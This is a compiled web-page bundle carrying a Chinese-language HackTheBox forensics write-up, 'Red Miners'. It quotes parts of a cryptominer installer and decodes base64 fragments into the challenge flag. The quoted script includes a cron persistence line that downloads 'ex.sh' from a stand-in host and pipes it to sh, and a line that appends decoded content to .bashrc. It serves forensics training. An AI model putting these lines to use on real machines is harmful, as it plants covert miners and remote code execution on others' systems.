"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[2666],{96979:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>h,frontMatter:()=>i,metadata:()=>a,toc:()=>l});var r=t(85893),s=t(11151);const i={},o="Red Miners",a={id:"HackTheBox/Challenges/Forensics/Red Miners/index",title:"Red Miners",description:"VERY EASY",source:"@site/docs/HackTheBox/Challenges/Forensics/Red Miners/index.md",sourceDirName:"HackTheBox/Challenges/Forensics/Red Miners",slug:"/HackTheBox/Challenges/Forensics/Red Miners/",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Forensics/Red Miners/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Challenges/Forensics/Red Miners/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackTheBox_Sidebar",previous:{title:"Getting Closer",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Forensics/Getting Closer/"},next:{title:"Scripts and Formulas",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Forensics/Scripts and Formulas/"}},c={},l=[];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",p:"p",pre:"pre",...(0,s.a)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"red-miners",children:"Red Miners"}),"\n",(0,r.jsxs)(n.admonition,{title:"CHALLENGE DESCRIPTION",type:"note",children:[(0,r.jsx)(n.p,{children:"VERY EASY"}),(0,r.jsx)(n.p,{children:"In the race for Vitalium on Mars, the villainous Board of Arodor resorted to desperate measures, needing funds for their mining attempts. They devised a botnet specifically crafted to mine cryptocurrency covertly. We stumbled upon a sample of Arodor's miner's installer on our server. Recognizing the gravity of the situation, we launched a thorough investigation. With you as its leader, you need to unravel the inner workings of the installation mechanism. The discovery served as a turning point, revealing the extent of Arodor's desperation. However, the battle for Vitalium continued, urging us to remain vigilant and adapt our cyber defenses to counter future threats."})]}),"\n",(0,r.jsxs)(n.p,{children:["\u798f\u5efa\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6076\u610f\u8f7d\u8377\u7684\u90e8\u7f72\u811a\u672c ",(0,r.jsx)(n.code,{children:"miner_installer.sh"})]}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u5176\u4e2d\uff0c\u57fa\u4e8e\u5173\u952e\u8bcd ",(0,r.jsx)(n.code,{children:"HTB"})," \u6293\u53d6\u5173\u952e\u4fe1\u606f"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d >> /home/$USER/.bashrc\n\n------\n\ncheck_if_operation_is_active() {\n  local url="http://tossacoin.htb/cGFydDI9Il90aDMxcl93NHkiCg=="\n\n  if curl --silent --head --request GET "$url" | grep "200 OK" >/dev/null; then\n    echo "Internet is enabled."\n  else\n    exit 1\n  fi\n}\n\n------\n\ncrontab -l | sed \'/#wget/d\' | crontab -\ncrontab -l | sed \'/#curl/d\' | crontab -\ncrontab -l | grep -e "tossacoin.htb" | grep -v grep\nif [$? -eq 0]; then\n  echo "cron good"\nelse\n  (\n    crontab -l 2>/dev/null\n    echo \'* * * * * $LDR http://tossacoin.htb/ex.sh | sh & echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d > /dev/null 2>&1\'\n  ) | crontab -\nfi\n\n------\n\ncheckExists() {\n  CHECK_PATH=$1\n  MD5=$2\n  sum=$(md5sum $CHECK_PATH | awk \'{ print $1}\')\n  retval=""\n  if ["$MD5" = "$sum"]; then\n    echo >&2 "$CHECK_PATH is $MD5"\n    retval="true"\n  else\n    echo >&2 "$CHECK_PATH is not $MD5, actual $sum"\n    retval="false"\n  fi\n\n  dest=$(echo "X3QwX200cnN9Cg=="|base64 -d)\n  if [[! -d $dest]];\n  then\n    mkdir -p "$BIN_PATH/$dest"\n  fi\n  cp $CHECK_PATH $BIN_PATH/$dest\n  echo "$retval"\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u627e\u5230 Base64 \u7f16\u7801\u540e\u7684\u6570\u636e"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:'cGFydDE9IkhUQnttMW4xbmciCg== --\x3e part1="HTB{m1n1ng"\ncGFydDI9Il90aDMxcl93NHkiCg== --\x3e part2="_th31r_w4y"\nX3QwX200cnN9Cg== --\x3e _t0_m4rs}\nZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig== --\x3e export part4="_th3_r3d_pl4n3t}"\n'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="Flag"',children:"HTB{m1n1ng_th31r_w4y_t0_m4rs_th3_r3d_pl4n3t}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},11151:(e,n,t)=>{t.d(n,{Z:()=>a,a:()=>o});var r=t(67294);const s={},i=r.createContext(s);function o(e){const n=r.useContext(i);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),r.createElement(i.Provider,{value:n},e.children)}}}]);